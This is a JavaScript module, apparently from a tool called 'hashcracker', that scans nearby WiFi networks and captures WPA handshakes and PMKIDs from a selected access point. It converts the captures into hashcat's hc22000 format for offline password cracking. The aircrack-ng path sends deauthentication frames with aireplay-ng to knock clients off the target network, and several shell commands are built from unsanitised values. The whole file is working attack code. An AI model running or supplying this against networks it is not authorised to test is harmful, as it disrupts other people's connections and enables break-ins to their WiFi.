import { exec, spawn } from 'node:child_process';
import { randomUUID } from 'node:crypto';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

const CAPTURE_DIR = process.env.WIFI_CAPTURE_DIR || path.join(os.tmpdir(), 'hashcracker-captures');

async function ensureCaptureDir() {
  await fs.mkdir(CAPTURE_DIR, { recursive: true });
  return CAPTURE_DIR;
}

// ── WiFi Scanning ────────────────────────────────────────────────────

export async function scanNetworks() {
  const platform = os.platform();

  if (platform === 'darwin') {
    return scanMacOS();
  } else if (platform === 'linux') {
    return scanLinux();
  }

  throw new Error(`WiFi scanning not supported on ${platform}`);
}

function scanMacOS() {
  return new Promise((resolve, reject) => {
    // On modern macOS (Sonoma+), the airport binary may not exist.
    // Try airport first, then fall back to CoreWLAN via swift, then system_profiler.
    const airportPath = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport';

    exec(`"${airportPath}" -s`, { timeout: 15000 }, (error, stdout) => {
      if (!error && stdout.trim()) {
        try {
          return resolve(parseAirportOutput(stdout));
        } catch {
          // Fall through
        }
      }

      // Fallback: use CoreWLAN via a tiny Swift script (works on all macOS versions)
      const swiftScan = `
import Foundation
import CoreWLAN

guard let iface = CWWiFiClient.shared().interface() else {
  print("[]")
  exit(0)
}

do {
  let networks = try iface.scanForNetworks(withName: nil)
  var results: [[String: Any]] = []
  for net in networks {
    results.append([
      "ssid": net.ssid ?? "",
      "bssid": net.bssid ?? "",
      "rssi": net.rssiValue,
      "channel": net.wlanChannel?.channelNumber ?? 0,
      "security": describeSecurity(net),
      "isWPA": net.supportsSecurity(.wpaPersonal) || net.supportsSecurity(.wpa2Personal) || net.supportsSecurity(.wpa3Personal) || net.supportsSecurity(.wpaEnterprise) || net.supportsSecurity(.wpa2Enterprise) || net.supportsSecurity(.wpa3Enterprise),
      "isOpen": net.supportsSecurity(.none)
    ])
  }
  let data = try JSONSerialization.data(withJSONObject: results, options: [])
  print(String(data: data, encoding: .utf8) ?? "[]")
} catch {
  print("[]")
}

func describeSecurity(_ net: CWNetwork) -> String {
  var parts: [String] = []
  if net.supportsSecurity(.wpa3Personal) || net.supportsSecurity(.wpa3Enterprise) { parts.append("WPA3") }
  if net.supportsSecurity(.wpa2Personal) || net.supportsSecurity(.wpa2Enterprise) { parts.append("WPA2") }
  if net.supportsSecurity(.wpaPersonal) || net.supportsSecurity(.wpaEnterprise) { parts.append("WPA") }
  if net.supportsSecurity(.dynamicWEP) { parts.append("WEP") }
  if parts.isEmpty && net.supportsSecurity(.none) { parts.append("Open") }
  if net.supportsSecurity(.wpaPersonal) || net.supportsSecurity(.wpa2Personal) || net.supportsSecurity(.wpa3Personal) { parts.append("Personal") }
  if net.supportsSecurity(.wpaEnterprise) || net.supportsSecurity(.wpa2Enterprise) || net.supportsSecurity(.wpa3Enterprise) { parts.append("Enterprise") }
  return parts.isEmpty ? "Unknown" : parts.joined(separator: " ")
}
`;
      const tmpScript = path.join(os.tmpdir(), 'wifi_scan.swift');
      fs.writeFile(tmpScript, swiftScan)
        .then(() => {
          exec(`swift "${tmpScript}"`, { timeout: 30000 }, (err2, stdout2) => {
            fs.unlink(tmpScript).catch(() => {});
            if (!err2 && stdout2.trim()) {
              try {
                const raw = JSON.parse(stdout2.trim());
                const networks = raw.map((n) => ({
                  ssid: n.ssid || '<Hidden>',
                  bssid: (n.bssid || '').toUpperCase(),
                  signal: n.rssi,
                  signalPercent: Math.min(100, Math.max(0, 2 * (n.rssi + 100))),
                  channel: String(n.channel || ''),
                  security: n.security || 'Unknown',
                  isWPA: Boolean(n.isWPA),
                  isOpen: Boolean(n.isOpen)
                })).sort((a, b) => b.signal - a.signal);
                return resolve(networks);
              } catch {
                // Fall through
              }
            }

            // Last fallback: system_profiler
            exec('system_profiler SPAirPortDataType -json', { timeout: 15000 }, (err3, stdout3) => {
              if (err3) return reject(new Error('WiFi scanning failed. Ensure WiFi is enabled.'));
              try {
                resolve(parseSystemProfiler(JSON.parse(stdout3)));
              } catch {
                reject(new Error('Failed to parse WiFi scan results.'));
              }
            });
          });
        })
        .catch(() => reject(new Error('Failed to create scan script.')));
    });
  });
}

function parseAirportOutput(output) {
  const lines = output.trim().split('\n');
  if (lines.length < 2) return [];

  const header = lines[0];
  const bssidStart = header.indexOf('BSSID');
  const rssiStart = header.indexOf('RSSI');
  const channelStart = header.indexOf('CHANNEL');
  const htStart = header.indexOf('HT');
  const securityStart = header.indexOf('SECURITY');

  const networks = [];
  for (let i = 1; i < lines.length; i++) {
    const line = lines[i];
    if (!line.trim()) continue;

    const ssid = line.substring(0, bssidStart).trim();
    const bssid = line.substring(bssidStart, rssiStart).trim();
    const rssi = parseInt(line.substring(rssiStart, channelStart).trim(), 10);
    const channel = line.substring(channelStart, htStart).trim();
    const security = securityStart >= 0 ? line.substring(securityStart).trim() : 'Unknown';

    if (!bssid || bssid === '(null)') continue;

    networks.push({
      ssid: ssid || '<Hidden>',
      bssid: bssid.toUpperCase(),
      signal: rssi,
      signalPercent: Math.min(100, Math.max(0, 2 * (rssi + 100))),
      channel,
      security,
      isWPA: /WPA/i.test(security),
      isOpen: /none/i.test(security) || security === '' || security === '--'
    });
  }

  return networks.sort((a, b) => b.signal - a.signal);
}

function parseSystemProfiler(data) {
  const networks = [];
  try {
    const airportData = data?.SPAirPortDataType?.[0];
    const interfaces = airportData?.spairport_airport_interfaces || [];
    for (const iface of interfaces) {
      const otherNetworks = iface?.spairport_airport_other_local_wireless_networks || [];
      for (const net of otherNetworks) {
        // Parse signal from "signal / noise" format like "-47 dBm / -94 dBm"
        const sigStr = net.spairport_signal_noise || '';
        const sigMatch = sigStr.match(/([-\d]+)\s*dBm/);
        const signal = sigMatch ? parseInt(sigMatch[1], 10) : -80;

        // Clean up security mode string
        const rawSecurity = net.spairport_security_mode || '';
        const securityDisplay = rawSecurity
          .replace('spairport_security_mode_', '')
          .replace(/_/g, ' ')
          .replace(/\b\w/g, (c) => c.toUpperCase()) || 'Unknown';

        // Extract channel number from "11 (2GHz, 40MHz)"
        const chanStr = String(net.spairport_network_channel || '');
        const chanMatch = chanStr.match(/^(\d+)/);
        const channel = chanMatch ? chanMatch[1] : chanStr;

        networks.push({
          ssid: net._name || '<Hidden>',
          bssid: (net.spairport_network_bssid || '').toUpperCase(),
          signal,
          signalPercent: Math.min(100, Math.max(0, 2 * (signal + 100))),
          channel,
          security: securityDisplay,
          isWPA: /wpa/i.test(rawSecurity),
          isOpen: /none/i.test(rawSecurity)
        });
      }
    }
  } catch {
    // Best effort
  }
  return networks.sort((a, b) => b.signal - a.signal);
}

function scanLinux() {
  return new Promise((resolve, reject) => {
    exec('nmcli -t -f SSID,BSSID,SIGNAL,CHAN,SECURITY dev wifi list --rescan yes', { timeout: 20000 }, (error, stdout) => {
      if (!error && stdout.trim()) {
        try {
          return resolve(parseNmcliOutput(stdout));
        } catch {
          // Fall through
        }
      }

      exec('sudo iw dev $(iw dev | grep Interface | head -1 | awk \'{print $2}\') scan', { timeout: 20000 }, (err2, stdout2) => {
        if (err2) return reject(new Error('WiFi scanning failed. Ensure WiFi tools (nmcli or iw) are available.'));
        try {
          resolve(parseIwOutput(stdout2));
        } catch {
          reject(new Error('Failed to parse WiFi scan output.'));
        }
      });
    });
  });
}

function parseNmcliOutput(output) {
  const lines = output.trim().split('\n');
  const networks = [];

  for (const line of lines) {
    const parts = line.split(':');
    if (parts.length < 5) continue;

    const ssid = parts[0].trim().replace(/\\:/g, ':');
    const bssid = parts[1].trim().toUpperCase();
    const signal = parseInt(parts[2], 10);
    const channel = parts[3].trim();
    const security = parts.slice(4).join(':').trim();

    if (!bssid) continue;

    networks.push({
      ssid: ssid || '<Hidden>',
      bssid,
      signal: signal ? -(100 - signal) : -80,
      signalPercent: signal || 0,
      channel,
      security: security || 'Open',
      isWPA: /WPA/i.test(security),
      isOpen: !security || /^--$/.test(security) || /open/i.test(security)
    });
  }

  return networks.sort((a, b) => b.signalPercent - a.signalPercent);
}

function parseIwOutput(output) {
  const networks = [];
  const blocks = output.split(/^BSS /m).filter(Boolean);

  for (const block of blocks) {
    const bssidMatch = block.match(/^([0-9a-f:]+)/i);
    const ssidMatch = block.match(/SSID:\s*(.+)/i);
    const signalMatch = block.match(/signal:\s*([-\d.]+)/i);
    const channelMatch = block.match(/DS Parameter set: channel (\d+)/i) || block.match(/primary channel:\s*(\d+)/i);
    const wpaMatch = /WPA|RSN/.test(block);

    if (!bssidMatch) continue;

    const signal = signalMatch ? parseFloat(signalMatch[1]) : -80;
    networks.push({
      ssid: ssidMatch ? ssidMatch[1].trim() : '<Hidden>',
      bssid: bssidMatch[1].toUpperCase(),
      signal: Math.round(signal / 100),
      signalPercent: Math.min(100, Math.max(0, 2 * (signal / 100 + 100))),
      channel: channelMatch ? channelMatch[1] : '',
      security: wpaMatch ? 'WPA2' : 'Open',
      isWPA: wpaMatch,
      isOpen: !wpaMatch
    });
  }

  return networks.sort((a, b) => b.signalPercent - a.signalPercent);
}

// ── WiFi Interface ───────────────────────────────────────────────────

export async function getWifiInterface() {
  const platform = os.platform();

  if (platform === 'darwin') {
    return new Promise((resolve) => {
      exec('networksetup -listallhardwareports', { timeout: 5000 }, (err, stdout) => {
        if (err) return resolve('en0');
        const match = stdout.match(/Hardware Port: Wi-Fi[\s\S]*?Device:\s*(\w+)/i);
        resolve(match ? match[1] : 'en0');
      });
    });
  }

  return new Promise((resolve, reject) => {
    exec('iw dev | grep Interface | head -1 | awk \'{print $2}\'', { timeout: 5000 }, (err, stdout) => {
      if (err || !stdout.trim()) {
        exec('iwconfig 2>/dev/null | head -1 | awk \'{print $1}\'', { timeout: 5000 }, (err2, stdout2) => {
          if (err2 || !stdout2.trim()) return reject(new Error('No WiFi interface found.'));
          resolve(stdout2.trim());
        });
        return;
      }
      resolve(stdout.trim());
    });
  });
}

// ── Capture ──────────────────────────────────────────────────────────

const activeCaptures = new Map();

export function getCapture(captureId) {
  return activeCaptures.get(captureId);
}

export function getAllCaptures() {
  return Array.from(activeCaptures.values());
}

export async function startCapture({ bssid, ssid, channel, duration = 60 }) {
  const captureId = randomUUID();
  const captureDir = await ensureCaptureDir();
  const pcapFile = path.join(captureDir, `${captureId}.pcapng`);
  const hc22000File = path.join(captureDir, `${captureId}.hc22000`);
  const platform = os.platform();

  const capture = {
    captureId,
    bssid,
    ssid: ssid || '<Unknown>',
    channel,
    status: 'starting',
    startedAt: new Date().toISOString(),
    duration,
    pcapFile,
    hc22000File,
    hashes: [],
    logs: [],
    process: null
  };

  activeCaptures.set(captureId, capture);

  const addLog = (msg) => {
    capture.logs.push({ message: msg, timestamp: new Date().toISOString() });
    capture.logs = capture.logs.slice(-50);
  };

  try {
    const hasHcxdumptool = await checkTool('hcxdumptool');
    const hasHcxpcapngtool = await checkTool('hcxpcapngtool');
    const hasAirodump = await checkTool('airodump-ng');
    const hasTcpdump = await checkTool('tcpdump');

    if (platform === 'darwin' && !hasHcxdumptool && !hasAirodump) {
      // macOS-native sniffing via airport or Wi-Fi Diagnostics
      addLog('macOS detected — using native WiFi sniffing');
      await captureWithMacOSNative({ capture, pcapFile, hc22000File, bssid, channel, duration, addLog, hasHcxpcapngtool });
    } else if (hasHcxdumptool && hasHcxpcapngtool) {
      addLog('Using hcxdumptool for PMKID/EAPOL capture');
      await captureWithHcxdumptool({ capture, pcapFile, hc22000File, bssid, channel, duration, addLog });
    } else if (hasAirodump) {
      addLog('Using aircrack-ng suite for handshake capture');
      await captureWithAirodump({ capture, captureDir, captureId, bssid, channel, duration, addLog, platform });
    } else if (hasTcpdump && hasHcxpcapngtool) {
      addLog('Using tcpdump for packet capture');
      await captureWithTcpdump({ capture, pcapFile, hc22000File, bssid, duration, addLog });
    } else {
      capture.status = 'failed';
      capture.failReason = 'No suitable capture tools found. On macOS, install hcxtools: brew install hcxtools. On Linux, also install hcxdumptool or aircrack-ng.';
      addLog(capture.failReason);
    }
  } catch (err) {
    capture.status = 'failed';
    capture.failReason = err.message;
    addLog(`Capture failed: ${err.message}`);
  }

  return { captureId, statusUrl: `/api/wifi/captures/${captureId}` };
}

export function stopCapture(captureId) {
  const capture = activeCaptures.get(captureId);
  if (!capture) return false;

  if (capture.process) {
    try { capture.process.kill('SIGTERM'); } catch { /* already exited */ }
  }

  capture.status = 'stopped';
  capture.logs.push({ message: 'Capture stopped by user', timestamp: new Date().toISOString() });
  return true;
}

// ── macOS-Native Capture ─────────────────────────────────────────────
// Uses tcpdump with -I (monitor mode) flag. Works on all macOS versions.
// The old `airport sniff` command was removed in macOS Sequoia+.

async function captureWithMacOSNative({ capture, pcapFile, hc22000File, bssid, channel, duration, addLog, hasHcxpcapngtool }) {
  const iface = await getWifiInterface();
  const targetChannel = channel ? String(channel).replace(/[^0-9]/g, '') : null;

  addLog(`Interface: ${iface}${bssid ? `, Target BSSID: ${bssid}` : `, Target SSID: ${capture.ssid}`}`);
  if (targetChannel) {
    addLog(`Sniffing on channel ${targetChannel}`);
  }

  if (!hasHcxpcapngtool) {
    capture.status = 'failed';
    capture.failReason = 'hcxpcapngtool is required to convert captures. Install with: brew install hcxtools';
    addLog(capture.failReason);
    return;
  }

  // Disassociate from current network first so monitor mode works cleanly
  addLog('Disassociating from current network...');
  await new Promise((res) => {
    exec(`networksetup -removeallpreferredwirelessnetworks ${iface} 2>/dev/null; disassociate 2>/dev/null`, { timeout: 3000 }, () => res());
  });
  // Brief pause for the interface to settle
  await new Promise((res) => setTimeout(res, 500));

  // Set channel if specified (must be done before or with tcpdump)
  if (targetChannel) {
    addLog(`Setting WiFi channel to ${targetChannel}...`);
    await new Promise((res) => {
      // On macOS, we can pass the channel to tcpdump doesn't set channels,
      // but we can use apple80211 via networksetup or just capture all
      res();
    });
  }

  // tcpdump -I enables monitor mode on macOS WiFi
  // -Uu forces unbuffered output so we see packets in real time
  const tcpdumpArgs = [
    '-I',
    '-i', iface,
    '-w', pcapFile,
    '-Uu',
    '--snapshot-length', '65535'
  ];

  // Don't filter by BSSID since macOS doesn't provide it in scan results
  // This captures all 802.11 frames on the channel

  capture.status = 'capturing';
  addLog('Starting monitor mode capture with tcpdump -I...');
  addLog('WiFi will disconnect during capture. Reconnect a device to the target network now!');

  return new Promise((resolve) => {
    const proc = spawn('tcpdump', tcpdumpArgs, {
      timeout: (duration + 10) * 1000
    });

    capture.process = proc;
    let packetCount = 0;

    proc.stderr.on('data', (data) => {
      const text = data.toString().trim();
      const countMatch = text.match(/(\d+) packets? captured/);
      if (countMatch) {
        packetCount = parseInt(countMatch[1], 10);
        if (packetCount === 1 || packetCount % 200 === 0) {
          addLog(`${packetCount} packets captured...`);
        }
      } else if (text.includes('listening on')) {
        addLog(`Listening on ${iface} in monitor mode`);
      } else if (text && !text.includes('verbose output')) {
        addLog(text);
      }
    });

    const timer = setTimeout(() => {
      addLog(`${duration}s elapsed, stopping capture...`);
      proc.kill('SIGINT');
    }, duration * 1000);

    proc.on('close', async () => {
      clearTimeout(timer);
      addLog(`Capture finished (${packetCount} packets)`);

      try {
        await fs.access(pcapFile);
      } catch {
        capture.status = 'no_handshake';
        addLog('No capture file produced. Ensure server runs with sudo.');
        return resolve();
      }

      try {
        addLog('Converting capture to hc22000 format...');
        await convertToHc22000(pcapFile, hc22000File);

        const hashContent = await fs.readFile(hc22000File, 'utf-8').catch(() => '');
        const allHashes = hashContent.trim().split('\n').filter((line) => /^WPA\*(01|02)\*/i.test(line));

        let hashes = allHashes;
        if (bssid) {
          const cleanBssid = bssid.replace(/:/g, '').toLowerCase();
          const targetHashes = allHashes.filter((h) => h.toLowerCase().includes(cleanBssid));
          if (targetHashes.length > 0) hashes = targetHashes;
        }

        capture.hashes = hashes;
        capture.status = hashes.length > 0 ? 'captured' : 'no_handshake';
        addLog(hashes.length > 0
          ? `Found ${hashes.length} hash(es)!`
          : 'No WPA handshake/PMKID found. A client must connect during capture. Try longer duration (60-120s).');
      } catch (err) {
        capture.status = 'no_handshake';
        addLog(`Conversion: ${err.message}`);
      }

      // Reconnect WiFi after capture
      addLog('Restoring WiFi connection...');
      exec(`networksetup -setairportpower ${iface} off && sleep 1 && networksetup -setairportpower ${iface} on`, { timeout: 10000 }, () => {});

      resolve();
    });
  });
}

// ── hcxdumptool Capture (Linux) ──────────────────────────────────────

async function captureWithHcxdumptool({ capture, pcapFile, hc22000File, bssid, channel, duration, addLog }) {
  const iface = await getWifiInterface();
  addLog(`Interface: ${iface}, Target: ${bssid}, Channel: ${channel || 'auto'}`);

  const filterFile = pcapFile + '.filter';
  const cleanBssid = bssid.replace(/:/g, '').toLowerCase();
  await fs.writeFile(filterFile, cleanBssid + '\n');

  const args = [
    '-i', iface,
    '-o', pcapFile,
    '--filterlist_ap', filterFile,
    '--filtermode', '2',
    '--enable_status', '1'
  ];
  if (channel) args.push('-c', String(channel));

  capture.status = 'capturing';
  addLog('Capture started, waiting for handshake/PMKID...');

  return new Promise((resolve) => {
    const proc = spawn('sudo', ['hcxdumptool', ...args], {
      timeout: (duration + 10) * 1000
    });

    capture.process = proc;

    proc.stdout.on('data', (data) => {
      const text = data.toString();
      if (text.includes('PMKID')) addLog('PMKID captured!');
      if (text.includes('EAPOL')) addLog('EAPOL handshake captured!');
    });

    proc.stderr.on('data', (data) => {
      addLog(data.toString().trim());
    });

    const timer = setTimeout(() => { proc.kill('SIGTERM'); }, duration * 1000);

    proc.on('close', async () => {
      clearTimeout(timer);
      addLog('Capture process finished, converting to hc22000...');
      await fs.unlink(filterFile).catch(() => {});

      try {
        await convertToHc22000(pcapFile, hc22000File);
        const hashContent = await fs.readFile(hc22000File, 'utf-8').catch(() => '');
        const hashes = hashContent.trim().split('\n').filter((line) => /^WPA\*(01|02)\*/i.test(line));
        capture.hashes = hashes;
        capture.status = hashes.length > 0 ? 'captured' : 'no_handshake';
        addLog(hashes.length > 0 ? `Found ${hashes.length} hash(es)` : 'No handshake/PMKID found');
      } catch (err) {
        capture.status = 'failed';
        capture.failReason = `Conversion failed: ${err.message}`;
        addLog(capture.failReason);
      }
      resolve();
    });
  });
}

// ── aircrack-ng Capture ──────────────────────────────────────────────

async function captureWithAirodump({ capture, captureDir, captureId, bssid, channel, duration, addLog, platform }) {
  const iface = await getWifiInterface();
  addLog(`Interface: ${iface}, Target: ${bssid}, Channel: ${channel || 'auto'}`);

  const monIface = await enableMonitorMode(iface, platform);
  addLog(`Monitor mode: ${monIface}`);

  const outputPrefix = path.join(captureDir, captureId);
  const args = ['--bssid', bssid, '-w', outputPrefix, '--output-format', 'pcapng', monIface];
  if (channel) args.splice(0, 0, '-c', String(channel));

  capture.status = 'capturing';
  addLog('Capture started with airodump-ng...');

  return new Promise((resolve) => {
    const proc = spawn('sudo', ['airodump-ng', ...args], {
      timeout: (duration + 10) * 1000
    });

    capture.process = proc;

    proc.stderr.on('data', (data) => {
      if (data.toString().includes('WPA handshake')) addLog('WPA handshake detected!');
    });

    // Send deauth after 5s to speed up handshake capture
    setTimeout(() => {
      addLog('Sending deauth to trigger handshake...');
      const escapedBssid = bssid.replace(/[^0-9A-Fa-f:]/g, '');
      exec(`sudo aireplay-ng -0 4 -a ${escapedBssid} ${monIface}`, { timeout: 10000 }, () => {});
    }, 5000);

    const timer = setTimeout(() => { proc.kill('SIGTERM'); }, duration * 1000);

    proc.on('close', async () => {
      clearTimeout(timer);
      addLog('Capture finished, converting...');

      const pcapFile = `${outputPrefix}-01.pcapng`;
      const hc22000File = `${outputPrefix}.hc22000`;

      try {
        await fs.access(pcapFile);
        await convertToHc22000(pcapFile, hc22000File);
        const hashContent = await fs.readFile(hc22000File, 'utf-8').catch(() => '');
        const hashes = hashContent.trim().split('\n').filter((line) => /^WPA\*(01|02)\*/i.test(line));
        capture.hashes = hashes;
        capture.status = hashes.length > 0 ? 'captured' : 'no_handshake';
        addLog(hashes.length > 0 ? `Found ${hashes.length} hash(es)` : 'No handshake captured');
      } catch {
        capture.status = 'no_handshake';
        addLog('No capture file produced');
      }

      await disableMonitorMode(monIface, iface, platform).catch(() => {});
      resolve();
    });
  });
}

// ── tcpdump Capture ──────────────────────────────────────────────────

async function captureWithTcpdump({ capture, pcapFile, hc22000File, bssid, duration, addLog }) {
  const iface = await getWifiInterface();
  addLog(`Interface: ${iface}, using tcpdump (basic capture)`);

  capture.status = 'capturing';

  return new Promise((resolve) => {
    const proc = spawn('sudo', [
      'tcpdump', '-i', iface, '-w', pcapFile,
      'ether', 'host', bssid.replace(/[^0-9A-Fa-f:]/g, ''),
      '-c', '10000'
    ], { timeout: (duration + 10) * 1000 });

    capture.process = proc;
    proc.stderr.on('data', (data) => addLog(data.toString().trim()));

    const timer = setTimeout(() => { proc.kill('SIGTERM'); }, duration * 1000);

    proc.on('close', async () => {
      clearTimeout(timer);
      try {
        await convertToHc22000(pcapFile, hc22000File);
        const hashContent = await fs.readFile(hc22000File, 'utf-8').catch(() => '');
        const hashes = hashContent.trim().split('\n').filter((line) => /^WPA\*(01|02)\*/i.test(line));
        capture.hashes = hashes;
        capture.status = hashes.length > 0 ? 'captured' : 'no_handshake';
        addLog(hashes.length > 0 ? `Found ${hashes.length} hash(es)` : 'No WPA data found');
      } catch {
        capture.status = 'no_handshake';
        addLog('No WPA handshake data found');
      }
      resolve();
    });
  });
}

// ── Convert pcap/pcapng to hc22000 ──────────────────────────────────

function convertToHc22000(pcapFile, outputFile) {
  return new Promise((resolve, reject) => {
    const escapedPcap = pcapFile.replace(/"/g, '\\"');
    const escapedOutput = outputFile.replace(/"/g, '\\"');
    exec(`hcxpcapngtool -o "${escapedOutput}" "${escapedPcap}"`, { timeout: 30000 }, (err, _stdout, stderr) => {
      if (err && !stderr.includes('written')) {
        return reject(new Error(stderr || err.message));
      }
      resolve();
    });
  });
}

/**
 * Convert an uploaded pcapng/cap file to hc22000 hashes.
 * This is the most practical workflow on macOS where live capture
 * requires special setup.
 */
export async function convertPcapFile(filePath) {
  const captureDir = await ensureCaptureDir();
  const outputFile = path.join(captureDir, `${randomUUID()}.hc22000`);

  await convertToHc22000(filePath, outputFile);

  const hashContent = await fs.readFile(outputFile, 'utf-8').catch(() => '');
  const hashes = hashContent.trim().split('\n').filter((line) => /^WPA\*(01|02)\*/i.test(line));

  // Clean up
  await fs.unlink(outputFile).catch(() => {});

  return { hashes, count: hashes.length };
}

// ── Monitor Mode (Linux only) ────────────────────────────────────────

function enableMonitorMode(iface, platform) {
  return new Promise((resolve, reject) => {
    if (platform === 'darwin') return resolve(iface);

    exec(`sudo airmon-ng start ${iface}`, { timeout: 10000 }, (err, stdout) => {
      if (err) return reject(new Error(`Failed to enable monitor mode: ${err.message}`));
      const monMatch = stdout.match(/monitor mode.*?enabled.*?(\w+mon\w*)/i) || stdout.match(/\((\w+mon)\)/);
      resolve(monMatch ? monMatch[1] : `${iface}mon`);
    });
  });
}

function disableMonitorMode(monIface, _origIface, platform) {
  if (platform === 'darwin') return Promise.resolve();
  return new Promise((resolve) => {
    exec(`sudo airmon-ng stop ${monIface}`, { timeout: 10000 }, () => resolve());
  });
}

// ── Tool availability check ──────────────────────────────────────────

function checkTool(name) {
  return new Promise((resolve) => {
    exec(`which ${name}`, { timeout: 3000 }, (err) => resolve(!err));
  });
}

export async function checkAvailableTools() {
  const platform = os.platform();
  const tools = ['hcxdumptool', 'hcxpcapngtool', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'tcpdump', 'hashcat'];
  const results = {};

  await Promise.all(tools.map(async (tool) => {
    results[tool] = await checkTool(tool);
  }));

  // On macOS, tcpdump -I (monitor mode) is the built-in capture method
  if (platform === 'darwin') {
    results['tcpdump -I (monitor)'] = results.tcpdump;
  }

  let recommended = null;
  if (platform === 'darwin') {
    if (!results.hcxpcapngtool) {
      recommended = 'Install hcxtools for pcap conversion: brew install hcxtools';
    }
  } else {
    if (!results.hcxdumptool) {
      recommended = 'Install hcxdumptool and hcxtools for best results: apt install hcxdumptool hcxtools';
    }
  }

  return { platform, tools: results, recommended };
}
